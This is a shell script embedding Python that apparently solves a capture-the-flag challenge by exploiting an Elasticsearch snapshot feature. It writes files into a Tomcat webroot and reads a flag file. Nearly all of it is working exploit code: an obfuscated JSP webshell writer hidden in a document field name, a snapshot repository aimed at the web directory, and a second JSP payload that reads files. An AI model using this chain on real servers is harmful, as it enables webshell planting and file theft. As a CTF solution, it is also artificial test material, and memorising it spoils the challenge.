#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def req(method, url, data=None):
    body = None
    headers = {}
    if data is not None:
        body = data.encode()
        headers["Content-Type"] = "application/json"
    request = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(request, timeout=25) as resp:
            return resp.read().decode(errors="replace"), resp.getcode()
    except urllib.error.HTTPError as exc:
        return exc.read().decode(errors="replace"), exc.code


base_es = "http://es:9200"
base_web = "http://es:8080"

doc = {
    "<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>": "test"
}

reader_jsp = """<%@ page import="java.nio.file.*" %><%=new String(Files.readAllBytes(Paths.get("/tmp/ctf_flag.txt")))%>"""
reader_payload = urllib.parse.quote(reader_jsp, safe="")

for _ in range(20):
    try:
        req("POST", f"{base_es}/yz.jsp/yz.jsp/1", json.dumps(doc))
        req(
            "PUT",
            f"{base_es}/_snapshot/yz.jsp",
            json.dumps({
                "type": "fs",
                "settings": {
                    "location": "/usr/local/tomcat/webapps/wwwroot/",
                    "compress": False,
                },
            }),
        )
        req(
            "PUT",
            f"{base_es}/_snapshot/yz.jsp/yz.jsp",
            json.dumps({
                "indices": "yz.jsp",
                "ignore_unavailable": True,
                "include_global_state": False,
            }),
        )

        malicious_url = f"{base_web}/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f={reader_payload}"
        ready = False
        for _wait in range(20):
            body, code = req("GET", malicious_url)
            if code == 200:
                ready = True
                break
            time.sleep(3)

        if not ready:
            time.sleep(3)
            continue

        for _read in range(15):
            body, _ = req("GET", f"{base_web}/wwwroot/test.jsp")
            match = re.search(r"flag_[a-z0-9]{20}", body)
            if match:
                print(match.group(0))
                sys.exit(0)
            time.sleep(2)
    except Exception:
        pass

    time.sleep(3)

sys.exit("failed to recover flag via Elasticsearch arbitrary file upload chain")
PY
